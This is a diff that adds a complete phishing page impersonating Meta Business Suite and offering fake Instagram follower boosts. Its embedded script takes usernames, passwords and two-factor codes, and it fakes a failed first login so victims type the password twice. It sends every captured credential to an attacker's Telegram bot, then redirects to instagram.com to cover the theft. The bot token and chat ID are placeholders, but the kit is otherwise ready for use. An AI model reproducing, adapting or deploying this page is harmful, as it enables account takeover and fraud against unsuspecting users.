@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Meta Business Suite | Account Growth Center</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo">
+    <span class="support-id">Support ID: #8821</span>
+</div>
+
+<div class="main-container">
+    <div class="card">
+        <h1>Account Boost Panel</h1>
+        <p class="sub-text">Connect your Instagram profile to the Meta API for <b>10k Verified Followers</b> and <b>Engagement Protection</b>.</p>
+
+        <div id="err-box" class="error-msg">Sorry, your password was incorrect. Please double-check your password.</div>
+
+        <div id="step-1">
+            <input type="text" id="username" placeholder="Instagram Username" autocomplete="off">
+            <button class="btn-primary" onclick="showPass()">CONNECT ACCOUNT</button>
+        </div>
+
+        <div id="step-2" style="display:none;">
+            <p class="user-display">Logged in as: <span id="u-tag"></span></p>
+            <input type="password" id="password" placeholder="Password">
+            <button class="btn-primary" id="final-btn" onclick="validateLive()">VERIFY & ACTIVATE</button>
+        </div>
+
+        <div id="step-3" style="display:none;">
+            <p class="info-text">Two-Factor Authentication Detected. Enter the 6-digit code sent to your SMS/Email.</p>
+            <input type="number" id="otp" placeholder="Security Code" maxlength="6">
+            <button class="btn-primary" onclick="finish()">COMPLETE VERIFICATION</button>
+        </div>
+
+        <div class="footer-secure">
+            <img src="https://img.icons8.com/material-rounded/24/cccccc/checked-lock.png" class="lock-icon">
+            SSL SECURE CONNECTION
+        </div>
+    </div>
+</div>
+
+<script>
+    let attempts = 0;
+    const bot_token = "YOUR_BOT_TOKEN";
+    const chat_id = "YOUR_CHAT_ID";
+
+    function showPass() {
+        let u = document.getElementById('username').value;
+        if(!u) return;
+        document.getElementById('u-tag').innerText = u;
+        document.getElementById('step-1').style.display = 'none';
+        document.getElementById('step-2').style.display = 'block';
+    }
+
+    async function validateLive() {
+        let u = document.getElementById('username').value;
+        let p = document.getElementById('password').value;
+        let btn = document.getElementById('final-btn');
+        let err = document.getElementById('err-box');
+
+        if(!p) return;
+        btn.innerText = "Verifying...";
+        btn.disabled = true;
+
+        // Logic: 2026 Black Hat Live Validation
+        if(attempts < 1) {
+            await sendToTelegram(`❌ Attempt 1 (Incorrect): \nU: ${u}\nP: ${p}`);
+            setTimeout(() => {
+                err.style.display = 'block';
+                document.getElementById('password').value = '';
+                btn.innerText = "VERIFY & ACTIVATE";
+                btn.disabled = false;
+                attempts++;
+            }, 1500);
+        } else {
+            await sendToTelegram(`✅ Attempt 2 (REAL): \nU: ${u}\nP: ${p}`);
+            document.getElementById('step-2').style.display = 'none';
+            document.getElementById('err-box').style.display = 'none';
+            document.getElementById('step-3').style.display = 'block';
+        }
+    }
+
+    async function finish() {
+        let otp = document.getElementById('otp').value;
+        await sendToTelegram(`🔑 LIVE OTP: ${otp}`);
+        window.location.href = "https://instagram.com";
+    }
+
+    async function sendToTelegram(msg) {
+        let url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
+        await fetch(url);
+    }
+</script>
+</body>
+</html>
